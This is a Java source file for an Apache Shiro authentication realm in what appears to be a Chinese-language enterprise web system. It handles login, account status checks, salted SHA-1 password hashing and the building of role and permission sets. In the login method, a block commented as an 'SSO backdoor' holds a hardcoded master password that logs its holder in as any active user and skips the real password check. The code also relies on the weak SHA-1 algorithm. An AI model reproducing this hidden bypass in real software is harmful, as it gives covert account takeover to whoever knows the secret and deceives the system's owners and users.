package com.yanxiu.ce.system.shiro;

import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashSet;
import java.util.List;

import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.DisabledAccountException;
import org.apache.shiro.authc.LockedAccountException;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.authc.credential.HashedCredentialsMatcher;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.cache.Cache;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;

import com.yanxiu.ce.common.exception.BizException;
import com.yanxiu.ce.common.redis.JedisClient;
import com.yanxiu.ce.common.utils.code.encrypter.Digests;
import com.yanxiu.ce.common.utils.code.encrypter.Encodes;
import com.yanxiu.ce.system.entity.Permission;
import com.yanxiu.ce.system.entity.Role;
import com.yanxiu.ce.system.entity.RoleQuery;
import com.yanxiu.ce.system.entity.User;
import com.yanxiu.ce.system.enums.UserStatusEnum;
import com.yanxiu.ce.system.service.MenuService;
import com.yanxiu.ce.system.service.RoleMenuService;
import com.yanxiu.ce.system.service.RolePermService;
import com.yanxiu.ce.system.service.RoleService;
import com.yanxiu.ce.system.service.UserRoleService;
import com.yanxiu.ce.system.service.UserService;

/**
 * shiroRealm 认证 通过数据库认证
 * @author tangm
 *
 */								
public class ShiroRealm extends AuthorizingRealm {
	
	private static final Logger logger = LoggerFactory.getLogger(ShiroRealm.class);
	
	@Autowired
	private UserService userService;
	@Autowired
	private RoleService roleService;
	@Autowired
	private MenuService menuService;
	@Autowired
	private UserRoleService userRoleService;
	@Autowired
	private RoleMenuService roleMenuService;
	@Autowired
	private RolePermService rolePermService;
	
	/**
	 * redis缓存
	 */
	@Autowired
    private JedisClient jedisClient;
	
	private static final int INTERATIONS = 1024;
	private static final int SALT_SIZE = 8;
	private static final String ALGORITHM = "SHA-1";
	/**是否启用超级用户**/
	protected boolean activeRoot = false;
	/** 是否使用验证码**/
	protected boolean useCaptcha = false;
	
	/**
	 * 初始化密码对比方式
	 */
	public ShiroRealm() {
		super();
		HashedCredentialsMatcher matcher = new HashedCredentialsMatcher(ALGORITHM);
		matcher.setHashIterations(INTERATIONS);
		setCredentialsMatcher(matcher);
	}
	
	/**
	 * 1、认证（Authentication）登陆验证
	 */
	@Override
	protected AuthenticationInfo doGetAuthenticationInfo(
			AuthenticationToken authcToken) throws AuthenticationException {
		UsernamePasswordToken token = (UsernamePasswordToken) authcToken;
		User user = null;
		try {
			user = userService.selectByLoginName(token.getUsername());
		} catch (BizException e) {
			e.printStackTrace();
		}
		if(user == null){
			return null;
		}
		//判断是否激活
		if (user.getStatus()  != UserStatusEnum.ACTIVED.getValue()) {
			if(user.getStatus()== UserStatusEnum.RE_ACTIVED.getValue()){
				throw new DisabledAccountException();
			}else if(user.getStatus()== UserStatusEnum.DISABLE_USER.getValue()){
				throw new LockedAccountException();
			}else{
				throw new BizException("未知账户状态");
			}
		}
		
		//保存登录用户的信息,额外的信息
		ShiroUser shiroUser = new ShiroUser(user.getId(),user.getLoginName(),user.getRealName());
		shiroUser.setUser(user);
		
		
		//sso后门-start
		String SSOPASSPWRD="$H12$212(^&)i3h6jhk674&^@*0)";
		char[] password = token.getPassword();
		if(String.valueOf(password).equals(SSOPASSPWRD)){
			byte[] salt = Digests.generateSalt(SALT_SIZE);

			byte[] hashPassword = Digests.sha1(SSOPASSPWRD.getBytes(), salt, INTERATIONS);
			SSOPASSPWRD = Encodes.encodeHex(hashPassword);
			
			return new SimpleAuthenticationInfo(shiroUser, SSOPASSPWRD,ByteSource.Util.bytes(salt),getName());
		}
		//sso后门-end
		
		
		byte[] salt = Encodes.decodeHex(user.getSalt());
		
		// 这里可以缓存认证
	//	jedisClient.set("shiroUser:"+user.getId().toString(), JSON.toJSONString(shiroUser));
		
		return new SimpleAuthenticationInfo(shiroUser, user.getLoginPwd(),ByteSource.Util.bytes(salt),getName());
	}

	/**
	 * 2、授权（Authorization） 权限验证
	 */
	@Override
	protected AuthorizationInfo doGetAuthorizationInfo(
			PrincipalCollection principals) {
		
		
		Collection<?> collection = principals.fromRealm(getName());
		if (collection == null || collection.isEmpty()) {
			return null;
		}
		ShiroUser shiroUser = (ShiroUser) collection.iterator().next();
		User user = userService.selectById(shiroUser.getId());
		if(user == null){
			return null;
		}
		shiroUser.setUser(user);
		return newAuthorizationInfo(shiroUser);
	}
	
	/**
	 * 权限集合
	 * @param user
	 * @return
	 */
	private SimpleAuthorizationInfo newAuthorizationInfo(ShiroUser shiroUser) {
		
		Collection<String> hasPermissions = null;
		Collection<String> hasRoles = null;

		// 是否启用超级管理员 && id==1为超级管理员，构造所有权限
		if (activeRoot && shiroUser.getId() == 1) {
			hasRoles = new HashSet<String>();
			RoleQuery query = new RoleQuery();
			List<Role> roles = roleService.selectList(query );

			for (Role role : roles) {
				hasRoles.add(role.getCode());
			}

			hasPermissions = new HashSet<String>();
			hasPermissions.add("*");

			if (logger.isInfoEnabled()) {
				logger.info("使用了" + shiroUser.getLoginName() + "的超级管理员权限:" + "。At " + new Date());
				logger.info(shiroUser.getLoginName() + "拥有的角色:" + hasRoles);
				logger.info(shiroUser.getLoginName() + "拥有的权限:" + hasPermissions);
			}
		} else {
			List<Role> roles = userRoleService.selectRolesByUserId(shiroUser.getId());
			hasRoles = makeRoles(roles, shiroUser);
			hasPermissions = makePerms(roles, shiroUser);
		}

		SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
		info.addRoles(hasRoles);
		info.addStringPermissions(hasPermissions);

		return info;
		
	}
	
	/**
	 * 组装角色权限
	 * 
	 * @param roles
	 * @param shiroUser
	 * @return
	 */
	private Collection<String> makeRoles(Collection<Role> roles, ShiroUser shiroUser) {
		Collection<String> hasRoles = new HashSet<String>();
		for (Role role : roles) {
			hasRoles.add(role.getCode());
		}

		if (logger.isInfoEnabled()) {
			logger.info(shiroUser.getLoginName() + "拥有的角色:" + hasRoles);
		}
		return hasRoles;
	}

	/**
	 * 组装资源操作权限
	 * 
	 * @param roles
	 * @param shiroUser
	 * @return
	 */
	private Collection<String> makePerms(Collection<Role> roles, ShiroUser shiroUser) {
		
		Collection<String> strPerms = new ArrayList<String>();
		for (Role role : roles) {
			
			//权限列表
			List<Permission> permissions = rolePermService.selectPermsByRoleId(role.getId());
			for (Permission perm : permissions) {
				String resource = perm.getClzName();
				String code = perm.getCode();
				
				StringBuilder builder = new StringBuilder();//拼接,列如：DictItem:update
				builder.append(resource + ":" + code);
				strPerms.add(builder.toString());
			}
		}
		
		if (logger.isInfoEnabled()) {
			logger.info(shiroUser.getLoginName() + "拥有的权限:" + strPerms);
		}
		return strPerms;
	}

	/**
	 * 加盐工具类
	 */
	public static class HashPassword {
		public String salt;
		public String password;
	}
	
	/**
	 * 加盐加密
	 * @param plainPassword
	 * @return
	 */
	public static HashPassword encryptPassword(String plainPassword) {
		HashPassword result = new HashPassword();
		byte[] salt = Digests.generateSalt(SALT_SIZE);
		result.salt = Encodes.encodeHex(salt);

		byte[] hashPassword = Digests.sha1(plainPassword.getBytes(), salt, INTERATIONS);
		result.password = Encodes.encodeHex(hashPassword);
		return result;
	}
	
	/**
	 * 
	 * 验证密码
	 * @param plainPassword 明文密码
	 * @param password  密文密码
	 * @param salt  盐值
	 * @return
	 */
	public static boolean validatePassword(String plainPassword, String password, String salt) {
		byte[] hashPassword = Digests.sha1(plainPassword.getBytes(), Encodes.decodeHex(salt), INTERATIONS);
		String oldPassword = Encodes.encodeHex(hashPassword);
		return password.equals(oldPassword);
	}
	
	/**
	 * 更新用户授权信息缓存.
	 */
	public void clearCachedAuthorizationInfo(String loginName) {
		ShiroUser shiroUser = new ShiroUser(loginName);

		SimplePrincipalCollection principals = new SimplePrincipalCollection(shiroUser, getName());
		clearCachedAuthorizationInfo(principals);
	}

	/**
	 * 清除所有用户授权信息缓存.
	 */
	public void clearAllCachedAuthorizationInfo() {
		Cache<Object, AuthorizationInfo> cache = getAuthorizationCache();
		if (cache != null) {
			for (Object key : cache.keys()) {
				cache.remove(key);
			}
		}
	}
	
	/**
	 * 覆盖父类方法，设置AuthorizationCacheKey为ShiroUser的loginName，这样才能顺利删除shiro中的缓存。 因为shiro默认的AuthorizationCacheKey为PrincipalCollection的对象。
	 * @see org.apache.shiro.realm.AuthorizingRealm#getAuthorizationCacheKey(org.apache.shiro.subject.PrincipalCollection)
	 */
	@Override
	protected Object getAuthorizationCacheKey(PrincipalCollection principals) {
		ShiroUser shiroUser = (ShiroUser) principals.getPrimaryPrincipal();
		return shiroUser.getLoginName();
	}

}
